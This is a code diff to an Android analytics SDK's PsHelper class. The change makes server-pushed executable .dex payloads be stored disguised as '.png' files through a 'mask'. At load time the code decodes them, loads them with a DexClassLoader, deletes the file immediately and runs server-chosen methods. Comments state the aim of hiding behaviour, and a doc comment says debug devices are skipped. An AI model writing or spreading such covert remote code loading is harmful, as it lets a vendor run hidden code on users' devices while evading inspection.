@@ -5,6 +5,7 @@ import android.text.TextUtils;
 import com.analysys.track.BuildConfig;
 import com.analysys.track.internal.content.EGContext;
 import com.analysys.track.internal.model.PsInfo;
+import com.analysys.track.utils.data.MaskUtils;
 import com.analysys.track.utils.data.Md5Utils;
 import com.analysys.track.utils.data.Memory2File;
 import com.analysys.track.utils.reflectinon.ClazzUtils;
@@ -23,6 +24,7 @@ public class PsHelper {
 
     /**
      * 将策罗解析问ps信息对象
+     *
      * @param serverPolicy 策略json
      * @return 剔除data（因为可能比较大，已经缓存文件没必要存在内存）的PsInfo列表，如果策略不包含ps节点，则返回空
      */
@@ -43,7 +45,7 @@ public class PsHelper {
             for (int i = 0; i < jsonArray.length(); i++) {
                 PsInfo psInfo = PsInfo.fromJson(jsonArray.getJSONObject(i));
                 //  验证文件
-                String sign = Md5Utils.getMD5(psInfo.getData()+"@"+psInfo.getVersion()).toLowerCase();
+                String sign = Md5Utils.getMD5(psInfo.getData() + "@" + psInfo.getVersion()).toLowerCase();
                 if (!psInfo.getSign().contains(sign)) {
                     continue;
                 }
@@ -51,8 +53,9 @@ public class PsHelper {
                 File file = new File(
                         EContextHelper.getContext().getFilesDir().getAbsolutePath()
                                 + EGContext.PS_CACHE_HOTFIX_DIR,
-                        "ps_v" + psInfo.getVersion() + ".dex");
-                Memory2File.savePatch(psInfo.getData(), file);
+                        "ps_v" + psInfo.getVersion() + ".png");
+                //戴上面具并直接落文件
+                MaskUtils.wearMask(file, psInfo.getData().getBytes("utf-8"));
                 //设置savePath
                 psInfo.setSavePath(file.getAbsolutePath());
                 //消除data内容，减少存储内容
@@ -61,7 +64,7 @@ public class PsHelper {
             }
             return psInfos;
         } catch (Throwable e) {
-            if(BuildConfig.ENABLE_BUG_REPORT){
+            if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
             }
         }
@@ -70,6 +73,7 @@ public class PsHelper {
 
     /**
      * 保存ps节点的调用信息，目前是存到ps，考虑可以加密存单独文件，区别不大
+     *
      * @param psInfos 要存储的ps调用信息
      */
     public static void save(List<PsInfo> psInfos) {
@@ -85,7 +89,7 @@ public class PsHelper {
             String psJson = jsonArray.toString(0);
             SPHelper.setStringValue2SP(EContextHelper.getContext(), EGContext.SP_DEX_PS, psJson);
         } catch (Throwable e) {
-            if(BuildConfig.ENABLE_BUG_REPORT){
+            if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
             }
         }
@@ -93,6 +97,7 @@ public class PsHelper {
 
     /**
      * 加载并运行调用信息，如果包含多个调用，则只用同一个classloader
+     *
      * @param info 调用信息记录
      */
     public static void load(PsInfo info) {
@@ -104,9 +109,40 @@ public class PsHelper {
             if (mdsBeans == null) {
                 return;
             }
+            boolean hasRun = false;
+            for (int i = 0; i < mdsBeans.size(); i++) {
+                if("1".equals(mdsBeans.get(i).getType())){
+                    hasRun = true;
+                    break;
+                }
+            }
+            //这个节点所有的方法都没启用，则直接不需要执行了。
+            if (!hasRun){
+                return;
+            }
             // todo 同一个dex多次调用要不要分离，目前是没有分离
+            //摘掉dex原始数据的面具
+            byte[] data = MaskUtils.takeOffMask(new File(info.getSavePath()));
+            if (data == null) {
+                return;
+            }
+            //原始数据验签
+            String sign = Md5Utils.getMD5(new String(data, "utf-8") + "@" + info.getVersion()).toLowerCase();
+            if (!info.getSign().contains(sign)) {
+                return;
+            }
+            //dex原始加密数据解密
+            byte[] dexBytes = Memory2File.decode(data);
+            File file = new File(
+                    EContextHelper.getContext().getFilesDir().getAbsolutePath()
+                            + EGContext.PS_CACHE_HOTFIX_DIR,
+                    "ps_v" + info.getVersion() + ".dex");
+            //真实的dex文件落地
+            Memory2File.writeFile(dexBytes, file);
             //获得一个classloader，这里使用object，是为了隐藏行为
-            Object loader = ClazzUtils.g().getDexClassLoader(EContextHelper.getContext(), info.getSavePath());
+            Object loader = ClazzUtils.g().getDexClassLoader(EContextHelper.getContext(), file.getAbsolutePath());
+            //内存读入后，立即删除
+            FileUitls.getInstance(EContextHelper.getContext()).deleteFile(file);
             for (int j = 0; j < mdsBeans.size(); j++) {
                 PsInfo.MdsBean mdsBean = mdsBeans.get(j);
                 if (mdsBean == null) {
@@ -119,7 +155,7 @@ public class PsHelper {
                 PatchHelper.tryLoadMethod(loader, EContextHelper.getContext(), mdsBean.getCn(), mdsBean.getMn(), mdsBean.getCg(), mdsBean.getAs(), null);
             }
         } catch (Throwable e) {
-            if(BuildConfig.ENABLE_BUG_REPORT){
+            if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
             }
         }
@@ -127,6 +163,7 @@ public class PsHelper {
 
     /**
      * 加载并运行所有的调用信息
+     *
      * @param psInfos 要运行的调用信息
      */
     public static void loads(List<PsInfo> psInfos) {
@@ -139,7 +176,7 @@ public class PsHelper {
                 load(item);
             }
         } catch (Throwable e) {
-            if(BuildConfig.ENABLE_BUG_REPORT){
+            if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
             }
         }
@@ -169,7 +206,7 @@ public class PsHelper {
                     }
                     loads(psInfos);
                 } catch (Throwable e) {
-                    if(BuildConfig.ENABLE_BUG_REPORT){
+                    if (BuildConfig.ENABLE_BUG_REPORT) {
                         BugReportForTest.commitError(e);
                     }
                 }
@@ -180,6 +217,7 @@ public class PsHelper {
 
     /**
      * 解析并保存策略下发的ps节点，如果当前设备未调试设备，则不存储，也不加载
+     *
      * @param serverPolicy 策略信息
      */
     public static void parserAndSave(JSONObject serverPolicy) {
@@ -190,7 +228,7 @@ public class PsHelper {
             }
             save(parserPs(serverPolicy));
         } catch (Throwable e) {
-            if(BuildConfig.ENABLE_BUG_REPORT){
+            if (BuildConfig.ENABLE_BUG_REPORT) {
                 BugReportForTest.commitError(e);
             }
         }
